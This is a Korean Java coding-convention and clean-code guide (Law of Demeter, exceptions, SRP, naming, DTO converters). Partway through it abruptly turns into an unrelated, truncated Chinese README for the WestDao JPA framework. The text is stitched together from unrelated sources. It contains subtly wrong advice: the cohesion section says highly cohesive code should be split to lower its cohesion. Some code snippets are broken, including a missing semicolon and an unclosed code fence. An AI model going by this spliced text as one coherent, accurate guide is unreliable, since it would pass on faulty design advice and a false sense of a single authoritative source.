단순 정보만 주는 주석은 아무런 가치가 없고 오히려 코드의 의도만 해치게 되고 잘못된 정보를 제공할 가능성이 높으므로 필수적인 내용만을 기록하는게 좋다.

# 형식 맞추기 
들여쓰기, 빈 행으로 가시성을 확보하거나 적절한 수준의 행 길이를 맞추는 등의 노력은 결국 코드의 품질과 가독성에 직결된다.
20자~60바 정도의 가로행이 적절하고 그보다 더 짧을 수록 인지율이 올라간다. <br>
또한 팀이라면 팀 내부에서 명명법이나 코딩 규칙을 마련해서 이 형식을 따라 개발을 진행해야 한다.

# 객체와 자료 구조 
### 디미터의 법칙 : 오직 하나의 점(.)에 의해 호출되는 메서드만 호출해야 한다.

```java
public class Car {
   private Engine engine;

   public Car(Engine engine) {
      this.engine = engine;
   }

   public Engine getEngine() {
      return engine;
   }
}

public class Engine {
   public void start() {
      // 엔진을 시작하는 로직
   }
}

public class Driver {
   public void drive(Car car) {
      // 디미터의 법칙 위반: Car 객체에서 엔진에 직접 접근하여 메서드를 호출함
      car.getEngine().start(); // 엔진을 시작하는 메서드 호출
   }
}
```
Driver 클래스의 drive 메서드는 Car 클래스의 getEngine을 통해 start 메서드를 호출한다. 이렇게 하는 대신에 Car 클래스 내에서 엔진을 시작하는 메서드를 호출하도록 변경해야 한다.

```java
public class Car {
    private Engine engine;

    public Car(Engine engine) {
        this.engine = engine;
    }

    public void startEngine() {
        engine.start();
    }
}

public class Engine {
    public void start() {
        // 엔진을 시작하는 로직
    }
}

public class Driver {
    public void drive(Car car) {
        car.startEngine(); // 디미터의 법칙 준수: Car 클래스에서 엔진 시작 메서드를 호출함
    }
}
```
Driver 클래스에서는 Car 객체의 startEngine 메서드만 호출하여 엔진을 시작할 수 있으며, 이로써 Car 클래스가 엔진에 대한 내부 구현을 캡슐화하고 외부로 노출하지 않게 된다.

### 자료 전달 객체
DTO(Data Transfer Object)를 통해 전송해야 하는 데이터를 명확하게 정의하고 모듈간의 결합도를 낮춰야 한다. <br>
데이터를 전달하는 과정에서 객체를 직접 사용하면 객체의 내부 구조에 의존하게 되어 결합도가 높아지고, 유연성과 재사용성이 저하된다.<br>
또한 다른 서비스를 호출하여 데이터를 전송할 때 불필요하게 많은 데이터가 전송될 가능성이 있으므로 적절한 전달 객체를 통해 데이터 전송의 명확성과 안전성을 확보하고, 시스템의 결합도를 낮추어 유지 보수성과 확장성을 향상시켜야 한다. 

# 오류 처리 


### 오류 코드보다 예외를 사용하라. 
오류 코드 대신에 예외를 사용하는 것을 권장한다. 예외를 사용하면 코드의 가독성이 향상되고 오류 처리가 명확해지며, 코드의 유연성과 안정성이 향상된다.

````java
public class Calculator {
    public int divide(int dividend, int divisor) {
        if (divisor == 0) {
            return -1; // 오류 코드 반환
        }
        return dividend / divisor;
    }
}
````
이런 코드는 예외가 발생한건지 로직에서 더 이상 수행할 수 없는 것인지 판단하기 어렵다. 
아래와 같이 바꿔야 한다.

```java
public class Calculator {
    public int divide(int dividend, int divisor) {
        if (divisor == 0) {
            throw new IllegalArgumentException(""Divisor cannot be zero""); // 예외 발생
        }
        return dividend / divisor;
    }
}
```

### null을 반환하지 마라.
null을 반환하는 것은 호출자가 해당 값이 null인지 확인하고 처리해야 하므로 코드의 가독성과 안전성이 저하될 수 있다. 
따라서 return null 과 같은 코드를 넘겨주지 말고 명시적으로 예외를 발생시켜야 한다.
```java
if (user == null) {
   throw new IllegalArgumentException(""User not found with username: "" + username);
}
```

# 클래스 

### 클래스 작성 규칙 
클래스 체계상 클래스를 정의하는 표준 자바 규칙은 아래와 같다. 
1. 상수(Constant): 클래스 수준에서 사용되는 상수를 정의. 정적 공개 상수가 맨 처음 나오고 다음으로 정적 비공개가 나온다.
2. 멤버 변수(Fields): 클래스의 상태를 표현하는 멤버 변수를 정의. 
3. 생성자(Constructor): 클래스의 객체를 생성할 때 호출되는 생성자를 정의.
4. 메서드(Methods): public 메서드가 나오고 그 뒤에 private 호출 메서드를 순차적으로 작성해준다.

아래의 예제를 보자.
```java
public class ExampleClass {

    // 상수
    private static final int MAX_SIZE = 100;
    private static final String DEFAULT_NAME = ""Default"";

    // 멤버 변수
    private int size;
    private String name;

    // 생성자
    public ExampleClass() {
        this.size = 0;
        this.name = DEFAULT_NAME;
    }

    public ExampleClass(int size, String name) {
        this.size = size;
        this.name = name;
    }

    // 메서드
    public int getSize() {
        return size;
    }

    public void setSize(int size) {
        this.size = size;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    // 중첩 클래스
    private static class NestedClass {
        // 중첩 클래스의 멤버 변수, 생성자, 메서드 등
    }
}
```

### 클래스는 작게 설계 해야한다. 
### SRP

SRP(Single Responsibility Principle, 단일 책임 원칙)는 소프트웨어 개발에서 클래스나 모듈은 하나의 책임만 가져야 한다는 의미로, 이는 클래스가 변경되어야 하는 이유가 단 하나뿐이어야 함을 의미한다.
```java
public class ReportGenerator {

    public void generateReport() {
        // 보고서 생성 로직
        String data = fetchDataFromDatabase();
        formatData(data);
        saveReportToFile(data);
    }

    private String fetchDataFromDatabase() {
        // 데이터베이스에서 데이터를 가져오는 로직
        return ""Data from database"";
    }

    private void formatData(String data) {
        // 데이터 포맷팅 로직
        System.out.println(""Formatting data: "" + data);
    }

    private void saveReportToFile(String data) {
        // 파일에 보고서를 저장하는 로직
        System.out.println(""Saving report to file: "" + data);
    }
}
```
이 코드는 보고서를 생성할 때 각종 타입에 따라 여러 역할을 수행하도록 구현되어 있다.
이는 SRP 위반이고 클래스가 변경 되어야 하는 이유가 다양하기 때문에 유지보수가 어려워진다. 따라서 아래의 방식으로 변경해야 한다.

```java
public class ReportGenerator {

    private DatabaseFetcher databaseFetcher;
    private DataFormatter dataFormatter;
    private FileSaver fileSaver;

    public ReportGenerator(DatabaseFetcher databaseFetcher, DataFormatter dataFormatter, FileSaver fileSaver) {
        this.databaseFetcher = databaseFetcher;
        this.dataFormatter = dataFormatter;
        this.fileSaver = fileSaver;
    }

    public void generateReport() {
        String data = databaseFetcher.fetchData();
        String formattedData = dataFormatter.formatData(data);
        fileSaver.saveToFile(formattedData);
    }
}
```

```java
public class DatabaseFetcher {

    public String fetchData() {
        // 데이터베이스에서 데이터를 가져오는 로직
        return ""Data from database"";
    }
}
```
```java
public class DataFormatter {

    public String formatData(String data) {
        // 데이터 포맷팅 로직
        return ""Formatted data: "" + data;
    }
}
```


```java
public class FileSaver {

    public void saveToFile(String data) {
        // 파일에 보고서를 저장하는 로직
        System.out.println(""Saving report to file: "" + data);
    }
}
```
ReportGenerator 클래스가 보고서 생성만 담당하도록 변경되었고 데이터 가져오기(DatabaseFetcher), 데이터 포맷팅(DataFormatter), 파일 저장(FileSaver) 등의 역할은 각각의 클래스로 분리되었다.
<br> 
이렇게 하면 각 클래스는 단일 책임을 갖게 되고, 변경이 발생할 경우 해당 클래스만 수정하면 되므로 유지 보수가 용이해진다.

### 응집도(Cohesion) 
응집도가 높은 코드는 가급적 작게 나눠서 응집도를 낮춰야 한다. 단, 한가지 기능만을 수행하기 위한 목적이라면 상관없다.



# 코드 기본 사용 규칙 모음
**** 
용례를 살펴보기 전에 알아둬야 할 것
> 
> 
> 하나의 코드 블럭으로 표현한 부분은 상단 설명에 대한 코드 샘플이다.
> 
> 상단 설명은 **Bold**로 표기 하였다.
> 
> 코드를 비교해야 하는 부분은 위와 아래로 나눠 위는 BadCase, 아래는 GoodCase로 기술하였다.
> 

### 규칙 1. 파일은 UTF-8로 인코딩 한다.

import 구문은 줄 바꿈 하지 않는다. (한 줄에 전체를 기술한다.)

### 규칙 2. 패키지 이름은 소문자이고, 언더라인을 쓰지 않는다.

패키지 구조는 최상위 도메인부터 역순으로 표기하는것이 컨벤션이다.

```java
 com.company.project
```

### 규칙 3. 클래스 이름은 UpperCamelCase (PascalCase) 로 작성한다. 단어와 단어 사이에는 대문자로 표기하고 명사로 명명한다.

약어를 사용하지 않는다. 인터페이스도 동일하다.

```bash
CustomerController # 클래스
CustomerService # 클래스 
Runnable # 인터페이스
```

### 규칙 4 .메소드 이름은 lowerCamelCase 로 작성한다. 메소드명은 동사 또는 동사구이다.

네이밍은 동사나 동사구로 짓고, boolean 값을 반환하는 경우는 is나 has로 시작하고 형용사로 기능하는 단어로 끝난다.

객체의 타입을 바꿔서, 다른 타입의 또 다른 객체를 반환하는 인스턴스 메서드의 이름은 보통 toType 형태로 짓는다.(toString, toArray)

```
getName()
isEmpty()
hasLevel()
toString()
```

### 규칙 5. 너무 짧은 변수명, 메소드명은 지양하고 의미있는 이름으로 지어야 한다. 메소드 명이나 변수명은 의미를 전달하는 용도로 작성해야 한다.

### 규칙 6. 상수는 CONST_CASE 이다. (UPPER_SNAKE_CASE)

- 상수는 내용이 변경 불가능 해야 한다.
- static final 필드이어야 한다.

<aside>
💡 예외사항 - 상수가 아닌 경우의 final (싱글톤 등)은 CamelCase로 작성한다.

</aside>

### 규칙 7. 상수가 아닌 필드는 lowerCamelCase로 작성한다.

매개변수의 이름은 lowerCamelCase로 작성한다. 매개변수가 4개를 초과할 경우 Object 타입으로 정의하는게 OCP(**Open-Closed Principle)** 설계에 맞는 동작 방식이다.

지역변수 이름은  lowerCamelCase로 작성한다. 변수 이름은 짧지만 의미가 있어야 하고, 언더스코어나 특수문자를 쓰면 안된다.

> *상수는 static final 키워드로 정의된 필드이다. 이 필드의 내용은 불변하며, 메소드는 부작용이 있으면 안된다. 이는 원시 자료형, String, 불변 타입, 불변 타입의 불변 collection을 포함한다. 만약 어떤 인스턴스의 상태가 바뀔 수 있다면 이는 상수가 아니다.*
>

```java
// 상수
static final int NUMBER = 5;
static final ImmutableList<String> NAMES = ImmutableList.of(""Ed"", ""Ann"");
static final ImmutableMap<String, Integer> AGES = ImmutableMap.of(""Ed"", 35, ""Ann"", 32);
static final Joiner COMMA_JOINER = Joiner.on(','); // Joiner는 불변이기 때문에.
static final SomeMutableType[] EMPTY_ARRAY = {};
enum SomeEnum { ENUM_CONSTANT }

// 상수 아님
static String nonFinal = ""non-final""; // final 없음
final String nonStatic = ""non-static""; // static 아님
static final Set<String> mutableCollection = new HashSet<String>(); // 가변타입 String 사용
static final ImmutableSet<SomeMutableType> mutableElements = ImmutableSet.of(mutable); // 가변타입의 변수로 초기화 함
static final ImmutableMap<String, SomeMutableType> mutableValues =
    ImmutableMap.of(""Ed"", mutableInstance, ""Ann"", mutableInstance2); // 가변타입의 변수로 초기화 함
static final Logger logger = Logger.getLogger(MyClass.getName());
static final String[] nonEmptyArray = {""these"", ""can"", ""change""};

```

### 규칙 8. 변수는 lowerCamelCase로 작성한다.

단, 변수에서 boolean 타입을 정의 할 경우 메소드와는 다르게 isXXX 와 같은 이름은 피하도록 한다. 일부 직렬화 예외가 발생할 수 있다.

임시 변수 (반복문을 순회하는 경우) 라도 가급적 한글자의 변수명 보다는 의미가 있는 이름으로 짓는것이 낫다.

# Usage (코드 예제 모음)

---

### 1. 괄호는 Egyptian brackets 을 따른다. 

```java
return () -> {
  while (condition()) {
    method();
  }
};

return new MyClass() {
  @Override public void method() {
    if (condition()) {
      try {
        something();
      } catch (ProblemException e) {
        recover();
      }
    } else if (otherCondition()) {
      somethingElse();
    } else {
      lastThing();
    }
  }
};
```

### 2.  빈 블럭이나 block-like construct 는 아래와 같이 사용 가능하지만 멀티 블럭에 섞어서 사용할순 없다. 

```java
// 가능
void doNothing() {}

// 가능
void doNothingElse() {
}
// 불가능 : multi-block 에서 괄호의 줄바꿈과 빈 블럭을 동시에 사용하지 말것 
try {
  doSomething();
} catch (Exception e) {}
```

### 3.  공백과 빈줄 

- 들여쓰기 (Indentation)은 4칸의 공백이어야 한다. (4 spaces key)
- “if”, “while”, “return”, “catch”, “switch”, “for” 등의 키워드와 이어지는 괄호에는 공백이 있어야 한다.
- 세미콜론, 쉼표 뒤에는 공백이 있어야 한다.
- 코드의 주요 부분을 식별하기 위해 빈 줄을 넣어준다. 예를 들어, 변수 선언 부분과 변수를 이용한 로직이 들어간다면 이 부분은 구분을 해주기 위해 빈 줄을 삽입해주는것이 좋다.

### 4.  Static Factory Method 의 관행적인 명명 

- from: 하나의 매개변수를 받아서 해당 타입의 인스턴스를 생성 (형변환)
- valueOf : 매개변수와 동일한 값을 갖는 인스턴스를 반환
- of: 여러개의 매개변수를 받아서 인스턴스를 생성 (aggregate)
- instance or getInstance: (매개변수를 받는다면 매개변수로 명시한 ) 인스턴스를 반환하지만 동일한 인스턴스임을 보장하지 않는다.
   - 보통 singleton을 구현할때 많이 사용하는 네이밍이지만 싱글톤의 경우 getInstance는 매개변수를 사용하지 않고 유일한 인스턴스를 반환한다.
- create or newInstance: getInstance 와 유사하지만 매번 새로운 인스턴스를 반환한다.
- getType: getInstance와 같으나 호출하는 클래스가 아닌 다른 타입의 인스턴스를 반환할때 사용
- newType — newInstance와 비슷하지만 호출하는 클래스가 아닌 다른 타입의 인스턴슬 반환할 때 사용. Type은 팩토리 메서드에서 반환된 객체의 유형을 나타낸다.

### 5.  List 타입에서 빈 컬렉션을 반환할때는 null이나 new 생성 리스트 타입 보다는 Empty Collection을 사용하는것이 GC에 유리하다. 

```java
List<Integer> list = new ArrayList();
Set<Integer> set = new HashSet();
Map<Integer,Integer> map = new HashMap();
```

```java
List<Integer> list = Collections.emptyList();
Set<Integer> set = Collections.emptySet();
Map<Integer,Integer> map = Collections.emptyMap()
```

### 6.  foreach 루프에서 콜렉션의 요소를 추가하거나 삭제하지 말것 

- Iterator 를 통해 요소를 조작하도록 한다.

```java
List<String> a = new ArrayList<String>();
a.add(""1"");
a.add(""2"");
for (String temp : a) {
    if (""2"".equals(temp)){
        a.remove(temp);
    }
} // bad 
```

```java
Iterator<String> it = a.iterator();
while (it.hasNext()) {    
    String temp =  it.next();             
    if (delete condition) {              
        it.remove();       
    }
} // good 
```

### 7.  Key, Value 콜렉션에서 null이 저장되는지 체크해두어야 한다. 

| Collection | Key | Value | Super | Note |
| --- | --- | --- | --- | --- |
| Hashtable | Null is not allowed | Null is not allowed | Dictionary | Thread-safe |
| ConcurrentHashMap | Null is not allowed | Null is not allowed | AbstractMap | Segment lock |
| TreeMap | Null is not allowed | Null is allowed | AbstractMap | Thread-unsafe |
| HashMap | Null is allowed | Null is allowed | AbstractMap | Thread-unsafe |

### 8.  Thread 

의미 있는 스레드 이름은 오류 정보를 추적하는 데 도움이 되므로 스레드 또는 스레드 풀을 생성할 때 이름을 지정하기를 추천한다.

```java
public class TimerTaskThread extends Thread {
    public TimerTaskThread() {
        super.setName(""TimerTaskThread""); 
        ...
    }
}
```

스레드는 스레드 풀에서 제공되어야 한다. 명시적으로 스레드를 생성하는것은 허용되지 않는다.

- 스레드 풀을 사용하면 스레드 생성 및 소멸 시간을 줄이고 시스템 리소스를 절약할 수 있다.
- 스레드 풀을 사용하지 않으면 유사한 스레드가 많이 생성되어 ""메모리 부족"" 또는 오버 스위칭 문제가 발생한다.

### 9.  String 타입에 적절하지 않은 데이터를 표기하지 말아야 한다. 

```java
String value = “True”; // bad
```

```java
boolean value = true; // good 
```

### 10.  String의 초기화에는 StringUtils.EMPTY을 사용하는 것을 권장한다. 

```java
String value = “”; // bad 
```

```java
String value = StringUtils.EMPTY; // good 
```

### 11.  불필요한 연산은 사용하지 말자. 

```java
public class BadExample {
    public void foo() {
        boolean flag = false;
        if (flag == true) { // bad 
            // some code
        } else {
            // some code
        }
    }
}
```

```java
public class GoodExample {
    public void foo() {
        boolean flag = false;
        if (flag) { // good 
            // some code
        } else {
            // some code
        }
    }
}
```


### 12.  Optional 사용 

Exception 혹은 null을 반환하는 method에는 Optional을 사용한다.

- Optional 값은 postfix로 Optional을 사용한다. <br>
- Exception은 정말 Exception이 필요한 부분에서 사용한다. 정상적인 흐름을 통제하기 위해서는 Exception 보다는 Optional을 사용한다.
- Optional은 null을 반환될 가능성이 있다는 것을 명시적으로 제시한다.
- Collection을 반환하는 경우에는 Optional을 사용하지 않는다.

```java
public ExportService getExportRequest() {
    ...
    ExportService exportInfo = getExportRequest();
    if(exportInfo == null){ // bad 
        ...
    }
}
```
```java
public Optional<ExportService> getExportRequest(){
    ...
    Optional<ExportService> exportInfoOptional = getExportRequest();
    if(exportInfoOptional.isEmpty()){
        // handling the null
    }
    ExportService exportInfo = exportInfoOptional.get();
}
```

### 13.  Predicate과 Valdator 구분해서 사용 
Predicate 와 Validator 의 용도가 다르다.

Predicate
- https://docs.oracle.com/javase/8/docs/api/java/util/function/Predicate.html
- Represents a predicate (boolean-valued function) of one argument.


Validator
- https://en.wikiversity.org/wiki/Object-Oriented_Programming/Validation
- Validate data Generate and handle exceptions Use assertions to validate parameter assumptions


그러므로 정리하면

Predicate는 1개의 arg 을 받아서 true/false 리턴하는 용도으로 사용한다. 

Validator는 데이타 유효성을 판단하는 용도으로 경우에 따라서 exception 발생시킨다. 

### 14.  변수가 너무 많은 클래스 구조는 별도의 객체로 분리하자. 

```java
public class BadExample { //bad 
    private int x;
    private int y;
    private int z;
    private int w;

    public void foo() {
        // some code
    }
}
```


```java
public class GoodExample { // good 
    private Point position;

    public void move(int x, int y) {
        // some code
    }
}
```
### 15.  가급적 예외를 구체화 한다. 

```java
public class BadExample {
    public void foo() {
        try {
            // some code
        } catch (Exception e) {
            // some code
        }
    }
}
```

```java
public class GoodExample {
    public void foo() throws SpecificException {
        // some code
    }
}
```

### 16.  짧은 try ~ catch 블럭 권장 

가독성면에서 try catch 블록은 짧아야 하며, 가급적 `exception`  블럭만 처리하여 가독성을 확보해야 한다.

```java
void tryCatchBlock() { // bad 
    try {
        statement1;
        statement2;
        statement3;    // can throw
        statement4;
    } catch (...) {
        …. 
    }
}
```

```java
void tryCatchBlock() { // good 
    statement1;
    statement2;
    boolean success = false;
    try {
        statement3;    // can throw
        success = true;
    } catch (...) {
        …  
    }
   
    if (success) {
        statement4;
    }
}
```

이에 대한 설명으로는 아래 링크를 참고한다.

tight try catch block (https://stackoverflow.com/questions/2633834/should-java-try-blocks-be-scoped-as-tightly-as-possible)
```text
the size of a try block makes no difference in performance. Performance is affected by actually raising exceptions at runtime, and that's independent of the size of the try block.

However, keeping try blocks small can lead to better programs.

You might catch exceptions to recover and proceed, or you might catch them simply to report them to the caller (or to a human, via some UI).

In the first case, failures from which you can recover are often very specific, and this leads to smaller try blocks.

In the second case, where an exception is caught so that it can be wrapped by another exception and re-thrown, or displayed to the user, small try blocks mean that you know more precisely which operation failed, and the higher-level context in which that call was made. This allows you to create more specific error reports.
```




### 17.  SpringFramework 에서 제공하는 자체 Util 들은 사용하면 안된다. 

- 이는 SpringFramework 내부에서 쓰고자 만든것으로, 만약 Utils성격의 클래스를 쓰고 싶다면 Apache Commons StringUtils를 사용해야 한다.

### 18.  Spring Annotation의 적절한 사용 

- @Component는 일반적인 스프링 빈으로 등록된(관리하는) 컴포넌트를 의미한다.
- @Service @Controller, @Repository 등은 Component 임과 동시에 세부적인 기능을 구분하는 명시를 위한 어노테이션이다.
- @Controller는 Presentation Layer를 담당하고, @Service는 서비스의 로직, @Repository 어노테이션은 DB에서 동작하는 Persistence 레이어를 표시한다.

기능 역할을 명확하게 하는 레이어라면 Component 보다는 구체적인 스테레오 타입인 하위 어노테이션을 권장한다.

# DTO (Converter vs Mapper)



실제 어플리케이션에서는 Entity 로 조회한 DB의 객체를 비즈니스 논리 계층에서 사용하기 위해 DTO에 매핑되어야 하는데 이를 치환하기 위해 수많은 DTO의 Setter, Getter  중복이 발생하게 된다. 데이터베이스의 테이블인 Entity들을 바로 API의 결과로 노출하면 안된다.

이를 해결 하기 위해 DTO 레이어를 두어야 하며, 이 DTO들의 Converter 를 작성하여 리턴해주는 패턴으로 개발을 해야 한다.

양방향이 아닌 단방향 변환의 경우에는 Mapper (한 개체의 속성을 다른 개체로 복사할 경우) 라고 명명하여 사용한다.

Converter 패턴의 목적은 해당 형식 간에 일반적인 양방향 변환 방법을 제공하여 깔끔한 구현을 허용하는 것이다.  Converter 패턴을 통해 양방향 매핑을 변환함으로써 기존 코드들의 쓸데없는 Setter/Getter 반복 작업을 혁신적으로 줄일 수 있다.

아래의 예제를 참고하자.

```java
public class Converter<T, U> {

  private final Function<T, U> fromDto;
  private final Function<U, T> fromEntity;

  public Converter(final Function<T, U> fromDto, final Function<U, T> fromEntity) {
    this.fromDto = fromDto;
    this.fromEntity = fromEntity;
  }

  public final U convertFromDto(final T dto) {
    return fromDto.apply(dto);
  }

  public final T convertFromEntity(final U entity) {
    return fromEntity.apply(entity);
  }

  public final List<U> createFromDtos(final Collection<T> dtos) {
    return dtos.stream().map(this::convertFromDto).collect(Collectors.toList());
  }

  public final List<T> createFromEntities(final Collection<U> entities) {
    return entities.stream().map(this::convertFromEntity).collect(Collectors.toList());
  }
}
```

변환 하고자 하는 대상 객체는 위의 기본 Converter 제네릭을 상속하여 구현한다.

```java
public class UserConverter extends Converter<UserDto, User> {

  public UserConverter() {
      super(UserConverter::convertToEntity, UserConverter::convertToDto);
  }

  private static UserDto convertToDto(User user) {
      return new UserDto(user.getFirstName(), user.getLastName(), user.isActive(), user.getUserId());
  }

  private static User convertToEntity(UserDto dto) {
      return new User(dto.getFirstName(), dto.getLastName(), dto.isActive(), dto.getEmail());
  }

}
```

UserDto 와 User Entity 의 변환은 아래와 같이 간단하게 처리 할 수 있다.

```java
var userConverter = new UserConverter();
var dtoUser = new UserDto(""John"", ""Doe"", true, ""whatever[at]wherever.com"");
var user = userConverter.convertFromDto(dtoUser);
```

![그림 1-2](./converter.png)

그림 2

UserConvert 를 통해 dto와 entity 사이의 양방향 변환을 좀 더 명확하고 심플하게 처리할  수 있다.

제너릭 코드의 확장성에 대해서 굉장히 유연한 코드들을 작성할 수 있게 되므로써  Converter 코드들도 라이브러리등을 통해 코드를 자동으로 변환하게 만들수도 있다.

대표적으로 ModelMapper (참고 링크 : [https://modelmapper.org/getting-started/](https://modelmapper.org/getting-started/))가 유용한데, 아래와 같이 제너릭으로 확장해서 클래스간의 변환을 간편하게 적용할 수 있다.

```java
/**
 * @author CodeVillains
 */
@Component
public class EntityConverter {
    private final ModelMapper modelMapper;
    public EntityConverter(ModelMapper modelMapper) {
        this.modelMapper = modelMapper;
    }

    public <S, D> D convertToDto(S entity, Class<D> dto) {
        return modelMapper.map(entity, dto);
    }

    public <S, D> D convertToEntity(S dto, Class<D> entity) {
        return modelMapper.map(dto, entity);
    }

}
```

이 코드를 호출하는 부분에서 아래와 같이 사용할 수 있다.

```java
private final GoalService goalService;
private final EntityConverter entityConverter;
...

public GoalResponse findById(Long id) {
    Goal goal = goalService.findById(id).orElseThrow(() -> new GoalNotFoundException(id));
    GoalResponse response = entityConverter.convertToDto(goal, GoalResponse.class);  // entity to dto 
    return response;
}
```

Converter 클래스보다 ModelMapper 라이브러리를 이용한 EntityConverter 가 코드상으로 훨씬 이해하기 편할 것이다.

만약 List 타입의 오브젝트 매핑을 하고자 한다면 아래와 같이 변환 코드를 만들어서 사용할 수 있다.

```java
public <S, D> List<D> convertListToDto(List<S> sourceList, Class<D> destinationType) {
    return sourceList.stream()
            .map(source -> modelMapper.map(source, destinationType))
            .collect(Collectors.toList());
}

public <S, D> List<D> convertListToEntity(List<S> sourceList, Class<D> destinationType) {
    return sourceList.stream()
            .map(source -> modelMapper.map(source, destinationType))
            .collect(Collectors.toList());
}
```

실제 호출하는 부분의 코드는 아래와 같다.

```java
List<DtoClass> dtoList = converter.convertListToDto(entityList, DtoClass.class);
for (DtoClass dto : dtoList) {
    System.out.println(dto.getId());
    System.out.println(dto.getName());
}

List<EntityClass> convertedEntityList = converter.convertListToEntity(dtoList, EntityClass.class);
for (EntityClass entity : convertedEntityList) {
    System.out.println(entity.getId());
    System.out.println(entity.getName());
}
```

欢迎来到 WestDao！这个项目旨在 用更少的代码完成日常开发工作，直接给出DEMO

```java
@RestController
public class WestUserController {
    @PostMapping(""/user/save"")
    public Result<Object> saveUser(@RequestBody WestUser user) {
        user.setAvatar(""default.png"").save();
        return Result.successResult();
    }
}
```

几行代码，便完成了用户信息保存

```java
    @PostMapping(""/user/delete"")
    public Result<Object> deleteById(WestUser user) {
        Assert.notNull(user.getId(), ""id is required"");
        boolean success = user.deleteById();
        return Result.successResult(success);
    }

同理，删、查、改也不会掉链子

### 介绍

[westDao](https://github.com/westwong/westDao/tree/master/WestDaoCore)是基于[Spring Data JPA](https://spring.io/projects/spring-data-jpa)完成的持久层框架，并且借鉴了[MyBatis-plus](https://baomidou.com/) 的代码风格，能够动态的生成[JPQL](https://docs.oracle.com/cd/E29542_01/apirefs.1111/e13946/ejb3_langref.html)，

完整的保留JPA的原生属性，你在享受JPA无表管理的方便之余，也能感受到如MyBatis-plus般的链式代码，强大JPQL让你对平台兼容性再无后顾之忧

```java
 private static LambdaQuery<User> getJPQL(TestDto dto) {
        return West.<User>queryJPQL()
                .eq(dto.isEq(), User::getId, 20L)
            	// 对于or调用专门说一下，因为JPA原始框架的原因 JPQL or()的括号会被省去，调试时注意
                .or(dto.isOr(), (q -> q.eq(User::getId, 18L).eq(User::getName, dto.getName())
                ))
                .and(dto.isAnd(), (q -> q.eq(User::getId, 18L).or(q1 -> q1.eq(User::getName, dto.getName()))
                ))
                .ne(dto.isNe(), User::getAge, 79)
                .le(dto.isLe(), User::getAge, 20)
                .ge(dto.isGe(), User::getAge, 80)
                .between(dto.isBetween(), User::getAge, 20, 80)
                .notBetween(dto.isNotBetween(), User::getAge, 20, 80)
                .like(dto.isLike(), User::getName, ""ru"")
                .likeLeft(dto.isLikeLeft(), User::getName, ""ac"")
                .likeRight(dto.isLikeRight(), User::getName, ""da"")
                .in(dto.isIn(), User::getAge, Arrays.asList(20, 21, 22))
                .notIn(dto.isNotIn(), User::getAge, Arrays.asList(20, 21, 22))
                .isNull(dto.isWasNull(), User::getName)
                .isNotNull(dto.isWasNotNull(), User::getName)
                .inJPQL(dto.isInJpql(), User::getName, ""select nickName from UserInfo where id = 1"");
    }
```

```
@RequestMapping(""/v1/user/update"")
public Result<Object> updateToPrams(WestUser user) {
    int num = user.update(
            West.updateJPQL(User.class).update(new User().setAge(10)).eq(User::getId, 20L)
    );
    return Result.successResult(num);
}
```

总之一个思想，对象自己处理自己，自己给自己提供一切持久层方法，你不用关心如何调用（**Wise Exection**）

只管写（**Simple Tools**)

当然我同样也对链式调用赋于DAO能力

```java
@RequestMapping(""/v2/user/update"")
@Transactional
public Result<Object> updateToPramsV2(User user) {
    int execute = West.updateJPQL(user).eq(User::getId, 20L).execute();
    return Result.successResult(execute);
}
@RequestMapping(""/v2/user/findAll"")
public Result<Object> findALLV2(TestDto dto) {
    Map<String, Object> count = getJPQL(dto).select(""count(1) as total"").getMap();
    Map<String, Object> sum = getJPQL(dto).select(""sum(age) as total"").getMap();
    Map<String, Object> map = getJPQL(dto).getMap();
    List<Map<String, Object>> maps = getJPQL(dto).listMap();

    User entity = getJPQL(dto).getEntity();
    List<User> users = getJPQL(dto).listEntity();
    Map<String, Object> result = new HashMap<>(4);
    result.put(""count"", count);
    result.put(""sum"", sum);
    result.put(""map"", map);
    result.put(""maps"", maps);
    result.put(""entity"", entity);
    result.put(""users"", users);
    return Result.successResult(result);
}

@RequestMapping(""/v2/user/page"")
public Result<Object> pageV2(TestDto dto) {
    Page<User> pageUser = getJPQL(dto).pageEntity(PageRequest.of(dto.getPageNum(), dto.getPageSize()));
    Page<Map<String, Object>> pageMap = getJPQL(dto).pageMap(PageRequest.of(dto.getPageNum(), dto.getPageSize()));
    Map<String, Object> result = new HashMap<>(4);
    result.put(""map"", pageMap);
    result.put(""users"", pageUser);
    return Result.successResult(result);
}

@RequestMapping(""/v2/user/deleteAll"")
@Transactional
public Result<Object> deleteAllV2(User user) {
    int execute = West.deleteJPQL(user).execute();
    int execute1 = West.<User>deleteJPQL().execute();
    return Result.successResult(execute);
}

// 对group limit orderBY的支持
@RequestMapping(""/v2/user/list"")
public Result<Object> listV2() {
    List<User> orderBY = West.<User>queryJPQL()
            .orderByDesc(User::getAge)
            .orderByAsc(User::getId)
            .limit(10)
            .listEntity();
    List<Map<String, Object>> group = West.<User>queryJPQL()
         // age 不给别名就会默认为 'colnum0'
            .select(""age as age, count(1) as num"")
            .groupBy(User::getAge)
            .having(""age > 10"")
            .orderByAsc(User::getAge)
            .listMap();
    Map<String, Object> result = new HashMap<>(4);
    result.put(""orderBY"", orderBY);
    result.put(""group"", group);
    return Result.successResult(result);
}
```

我相信项目做得多的朋友，看到这里已经能知道优势了，什么service，什么dao，什么Respositroy ？我们通通暂时不管，一个Controller 能解决的事情，不要搞的那么麻烦。简单的数据有简单的处理办法，对于一些复杂多表逻辑你才有创建service的必要，毕竟省出来的时间是你的

### 开始

赋予实体对象以上能力，其实也很简单，你只需在标注@Entity的实体类上，再增加一个@WestDao

这里建议增加@Accessors(chain = true)，子类也将赋予链式调用能力

```java
@Entity
@Data
@Accessors(chain = true)
@WestDao(prefix = ""west"")
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    @Column(length = 32)
    private String name;
    @Column(columnDefinition = ""text"")
    private String avatar;
    private Integer age;
    @Column
    @DateTimeFormat(pattern = ""yyyy-MM-dd HH:mm:ss"")
    private LocalDateTime createTime;
    @PrePersist
    public void prePersistCreateTime() {
        if (createTime == null) {
            createTime = LocalDateTime.now();
        }
    }
}
```

是的，就只需要一个＠ＷestDao(prefix = ""west"")，当然""west""也可以是你喜欢的任何字符串，比如 love、me、you、like

哦，对了，你如果是看到这里，无所谓的，但是如果你跟着做，你要骂人了，因为你还没有引入依赖
根据版本引入<westdao.version>latest</westdao.version> 详情请看 releases

在<annotationProcessorPaths> 中把westdao-core 写在lombok 后面，保证执行顺序

```xml

<dependency>
    <groupId>cn.k2future</groupId>
    <artifactId>westdao-core</artifactId>
